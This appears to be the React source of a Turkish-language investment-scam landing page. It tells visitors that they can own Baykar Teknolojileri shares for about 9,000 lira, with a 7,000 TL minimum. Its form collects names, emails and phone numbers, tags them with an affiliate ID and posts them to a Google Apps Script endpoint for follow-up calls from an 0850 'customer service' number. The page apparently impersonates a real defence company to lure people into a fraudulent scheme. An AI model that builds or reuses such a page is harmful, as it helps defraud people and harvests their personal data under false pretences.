import React, { useState, useCallback } from "react";
import bayraktar from "../../public/bayraktar.png";
import bayraktar2 from "../../public/kizilelma.png";
import bayraktar3 from "../../public/havaaraci.png";

const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyOPxDyunv7RuV7NBHhTcnOLYdR-j7GeI6YIZypniroqRKGqYZ0jM-RoeGli57eywXXug/exec";

export const MainContent: React.FC = () => {
    const [formData, setFormData] = useState({
        name: "",
        surname: "",
        email: "",
        phone: "",
        affilateId: "afp455",
        countryCode: "+90",
    });
    const [loading, setLoading] = useState(false);

    const handleChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setFormData((prev) => ({ ...prev, [name]: value }));
    }, []);

    const handleSubmit = useCallback(
        async (e: React.FormEvent<HTMLFormElement>) => {
            e.preventDefault();
            setLoading(true);

            try {
                await fetch(GOOGLE_SCRIPT_URL, {
                    method: "POST",
                    mode: "no-cors", // Bu modda response opaque olur, yani içeriğini okuyamazsınız.
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(formData),
                });
                alert("Form gönderildi!");
                setFormData({
                    name: "",
                    surname: "",
                    email: "",
                    phone: "",
                    affilateId: "afp455",
                    countryCode: "+90",
                });
            } catch (err) {
                console.log(err instanceof Error ? err.message : "An unknown error occurred");
            } finally {
                setLoading(false);
            }
        },
        [formData]
    );

    const scrollToForm = () => {
        const formElement = document.getElementById("formTorm");
        if (formElement) {
            formElement.scrollIntoView({ behavior: "smooth" });
        }
    };

    return (
        <section className="container mx-auto px-4 py-12">
            {/* Mobile Tasarımı: Küçük ekranlarda göster */}
            <div className="block md:hidden">
                <div className="flex flex-col gap-8">
                    {/* Üst Bilgi Bölümü */}
                    <div className="text-center">
                        <h2 className="text-2xl font-medium text-slate-400 tracking-widest mb-4">BAYKAR TEKNOLOJİLERİ</h2>
                        <p className="text-4xl font-bold text-slate-100 leading-tight mb-4">
                            9.000 lira yatırım yapın ve <span className="text-orange-400">Baykar Teknolojileri</span> hisselerine sahip olun.
                        </p>
                        <p className="text-lg text-gray-200 mb-2">
                            Yatırıma katılmak için, minumum yatırıma müsait 7.000 TL’ye sahip olmanız gerekmektedir.
                        </p>
                    </div>

                    {/* Resim Galerisi: Yatay kaydırılabilir */}
                    <div className="flex gap-4 overflow-x-auto">
                        <img src={bayraktar} alt="Bayraktar" className="w-40 flex-shrink-0 object-contain" />
                        <img src={bayraktar2} alt="Kızıl Elma" className="w-40 flex-shrink-0 object-contain" />
                        <img src={bayraktar3} alt="Hava Aracı" className="w-40 flex-shrink-0 object-contain" />
                    </div>

                    {/* Açıklama ve Buton */}
                    <div className="px-2 text-center">
                        <p className="text-base text-gray-200 mb-2">
                            Türkiye'nin önde gelen savunma şirketlerinden biri olan BAYKAR, sürekli olarak yeni ve yenilikçi teknolojilere yatırım
                            yapmaktadır.
                        </p>
                        <p className="text-sm text-gray-200 mb-2">
                            Drone'lar artık sizin yatırımınızla daha güçlü ve gelir getiren bir model haline geliyor.
                        </p>
                        <button
                            onClick={scrollToForm}
                            className="mt-4 px-6 py-3  bg-orange-400 text-white rounded-md hover:bg-blue-700 transition-colors"
                        >
                            Daha Fazla Bilgi İçin Form Doldurun
                        </button>
                    </div>

                    {/* Form Bölümü */}
                    <div id="formTorm">
                        <form onSubmit={handleSubmit} className="bg-gray-100 p-6 rounded-lg shadow-md">
                            <div className="mb-4">
                                <input
                                    type="text"
                                    name="name"
                                    placeholder="Adınız"
                                    value={formData.name}
                                    onChange={handleChange}
                                    className="w-full border border-gray-300 p-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                                />
                            </div>
                            <div className="mb-4">
                                <input
                                    type="text"
                                    name="surname"
                                    placeholder="Soyadınız"
                                    value={formData.surname}
                                    onChange={handleChange}
                                    className="w-full border border-gray-300 p-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                                />
                            </div>
                            <div className="mb-4">
                                <input
                                    type="email"
                                    name="email"
                                    placeholder="Email adresiniz"
                                    value={formData.email}
                                    onChange={handleChange}
                                    className="w-full border border-gray-300 p-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                                />
                            </div>
                            <div className="mb-4">
                                <input
                                    type="tel"
                                    name="phone"
                                    placeholder="+90 5XX XXX XX XX"
                                    value={formData.phone}
                                    onChange={handleChange}
                                    className="w-full border border-gray-300 p-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                                />
                            </div>
                            <button
                                type="submit"
                                disabled={loading}
                                className="w-full bg-orange-400 text-white py-3 rounded-md hover:bg-orange-500 transition-colors disabled:opacity-50"
                            >
                                {loading ? "Gönderiliyor..." : "Gönder"}
                            </button>
                            <p className="mt-2 text-xs text-gray-500 text-center">
                                *Yatırıma katılma hakkı için en az 7.000 TRY değerinde bir tutara sahip olmanız gerekmektedir.
                            </p>
                            <p className="mt-2 text-xs text-gray-500 text-center">
                                **Gereken şartları sağlayamadığınız takdirde başvurunuzu müşteri temsilciniz iptal etme hakkına sahiptir.
                            </p>
                            <p className="mt-2 text-xs text-gray-500 text-center">
                                ***Tarafınıza 0850' li müşteri hizmetleri tarafından yapılacak çağrı tamamen ücretsizdir.
                            </p>
                        </form>
                    </div>
                </div>
            </div>

            {/* Web Tasarımı: md ve üstü ekranlarda göster */}
            <div className="hidden md:block">
                <section className="w-full mx-auto px-4 py-12">
                    {/* items-stretch sayesinde her iki sütun da aynı yüksekliği alır */}
                    <div className="flex items-stretch gap-12 w-full">
                        {/* Sol Kısım: Resimler ve Yazı İçeriği */}
                        <div className="flex-1">
                            <div className="flex flex-col md:flex-row items-center gap-4 mb-8">
                                <img src={bayraktar} alt="Bayraktar" className="w-1/2 md:w-1/3 object-contain" />
                                <img src={bayraktar2} alt="Kızıl Elma" className="w-1/2 md:w-1/3 object-contain" />
                                <img src={bayraktar3} alt="Hava Aracı" className="w-1/2 md:w-1/3 object-contain" />
                            </div>
                            <h2 className="sm:text-2xl text-xl text-slate-400 font-medium mb-4 tracking-[0.4em]">Baykar Teknolojileri</h2>
                            <p className="sm:text-6xl text-3xl font-bold text-slate-200 leading-tight mb-4">
                                9.000 lira yatırım yapın ve <span className="text-orange-400">Baykar Teknolojileri</span> hisselerine sahip olun.
                            </p>
                            <p className="sm:text-lg text-base text-gray-500 mb-2">
                                Yatırıma katılmak için, minumum yatırıma müsait 7.000 TL sahip olmanız gerekmektedir.
                            </p>
                            <p className="text-sm text-gray-400 mb-4">
                                Türkiye'nin önde gelen savunma şirketlerinden biri olarak BAYKAR, sürekli olarak yeni ve yenilikçi teknolojilere
                                yatırım yapmayı misyon olarak görmekteyiz. Drone (insansız hava araçları) artık sizin yatırımınızla daha güçlü ve
                                gelir getiren bir model haline geliyor.
                            </p>
                            <button
                                onClick={scrollToForm}
                                className="mt-4 px-8 py-3 bg-gray-200 text-slate-700 rounded-md hover:bg-slate-700 hover:text-gray-200 transition-colors"
                            >
                                Daha Fazla Bilgi Almak İçin Form Doldurun
                            </button>
                        </div>

                        {/* Sağ Kısım: Form */}
                        <div className="flex-1">
                            {/* h-full ekleyerek sol sütunla aynı yüksekliği kaplamasını sağlıyoruz */}
                            <form
                                onSubmit={handleSubmit}
                                id="formTorm"
                                className="bg-gray-100 p-8 rounded-lg shadow-md text-center h-full flex flex-col justify-center"
                            >
                                <div className="m-8">
                                    <span className="text-3xl font-bold text-slate-700">Ücretsiz Danışmanlık İçin Talep Bırakın</span>
                                </div>
                                <div className="mb-4">
                                    <input
                                        type="text"
                                        name="name"
                                        placeholder="Adınız"
                                        value={formData.name}
                                        onChange={handleChange}
                                        className="w-full border border-gray-300 p-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                                    />
                                </div>
                                <div className="mb-4">
                                    <input
                                        type="text"
                                        name="surname"
                                        placeholder="Soyadınız"
                                        value={formData.surname}
                                        onChange={handleChange}
                                        className="w-full border border-gray-300 p-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                                    />
                                </div>
                                <div className="mb-4">
                                    <input
                                        type="email"
                                        name="email"
                                        placeholder="Email adresiniz"
                                        value={formData.email}
                                        onChange={handleChange}
                                        className="w-full border border-gray-300 p-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                                    />
                                </div>
                                <div className="mb-4">
                                    <input
                                        type="tel"
                                        name="phone"
                                        placeholder="+90 5XX XXX XX XX"
                                        value={formData.phone}
                                        onChange={handleChange}
                                        className="w-full border border-gray-300 p-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                                    />
                                </div>
                                <button
                                    type="submit"
                                    disabled={loading}
                                    className="w-full bg-orange-400 text-white py-3 rounded-md hover:bg-orange-500 transition-colors disabled:opacity-50"
                                >
                                    {loading ? "Gönderiliyor..." : "Gönder"}
                                </button>
                                <p className="mt-2 text-xs text-gray-500 text-center">
                                    *Yatırıma katılma hakkı için en az 7.000 TRY değerinde bir tutara sahip olmanız gerekmektedir.
                                </p>
                                <p className="mt-2 text-xs text-gray-500 text-center">
                                    **Gereken şartları sağlayamadığınız takdirde başvurunuzu müşteri temsilciniz iptal etme hakkına sahiptir.
                                </p>
                                <p className="mt-2 text-xs text-gray-500 text-center">
                                    ***Tarafınıza 0850' li müşteri hizmetleri tarafından yapılacak çağrı tamamen ücretsizdir.
                                </p>
                            </form>
                        </div>
                    </div>
                </section>
            </div>
        </section>
    );
};
